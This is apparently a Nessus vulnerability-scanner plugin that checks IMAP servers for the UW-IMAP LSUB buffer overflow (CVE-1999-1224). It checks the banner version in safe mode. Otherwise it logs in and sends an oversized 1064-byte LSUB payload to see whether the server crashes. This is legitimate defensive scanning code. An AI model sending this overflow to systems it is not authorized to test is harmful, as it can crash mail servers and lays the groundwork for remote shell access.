#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10625);
 script_cve_id("CVE-1999-1224");
 script_version ("$Revision: 1.15 $");
 
 
 name["english"] = "IMAP4rev1 buffer overflow after logon";
 name["francais"] = "dépassement de buffer dans IMAP4rev1";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
There is a buffer overflow in the remote imap server 
which allows an authenticated user to obtain a remote
shell.

Solution : upgrade your imap server or use another one
Risk factor : High";

 desc["francais"] = "
Il y a un dépassement de buffer dans le serveur imap
distant qui permet à un utilisateur authentifié d'obtenir
un shell.

Solution : mettez à jour votre serveur IMAP ou changez-le
Facteur de risque : Sérieux";

 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "checks for a buffer overflow in imapd";
 summary["francais"] = "vérifie la présence d'un dépassement de buffer dans imapd";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 
 family["english"] = "Gain a shell remotely";
 family["francais"] = "Obtenir un shell à distance";
 script_family(english:family["english"],
	       francais:family["francais"]); 
 script_dependencie("find_service.nes", "logins.nasl");
		       		     
 script_require_ports("Services/imap", 143);
 script_exclude_keys("imap/false_imap");
 exit(0);
}


port = get_kb_item("Services/imap");
if(!port)port = 143;


acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

if((!pass) ||
   (safe_checks()))
{
 banner = get_kb_item(string("imap/banner/", port));
 if(!banner)
 {
  if(get_port_state(port))
  {
   soc = open_sock_tcp(port);
   if(!soc)exit(0);
   banner = recv_line(socket:soc, length:4096);
   close(soc);
  }
 }
 
 if("IMAP4rev" >< banner)
 {
  if(ereg(pattern:".*IMAP4rev.* v12\.([0-1].*|2([0-5].*|6[0-4]))",
  	  string:banner))
	  {
	   alrt = "
The remote UW-IMAP server seems to be vulnerable to various
buffer overflow which allow an authenticated user to gain
a shell on this host.

An attacker may use this flaw to escalate his privileges.

*** Nessus solely relied on the server banner to 
*** issue this warning.

Solution : Upgrade to the latest version of UW-IMAP
Risk factor : High";

	security_hole(port:port, data:alrt);
	  }
 }
 exit(0);
}

if((acct == "")||(pass == ""))exit(0);


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 b = recv_line(socket:soc, length:1024);
 if(!strlen(b)){
 	close(soc);
	exit(0);
	}
 s1 = string("1 login ", acct, " ", pass, "\r\n");	
 send(socket:soc, data:s1);
 b = recv_line(socket:soc, length:1024);
 
 s2 = string("1 lsub ", raw_string(0x22, 0x22), " {1064}\r\n");
 send(socket:soc, data:s2);
 c = recv_line(socket:soc, length:1024);
 s3 = string(crap(1064), "\r\n");
 send(socket:soc, data:s3);
 
 c = recv_line(socket:soc, length:1024);
 if(strlen(c) == 0)security_hole(port);
 close(soc);
}

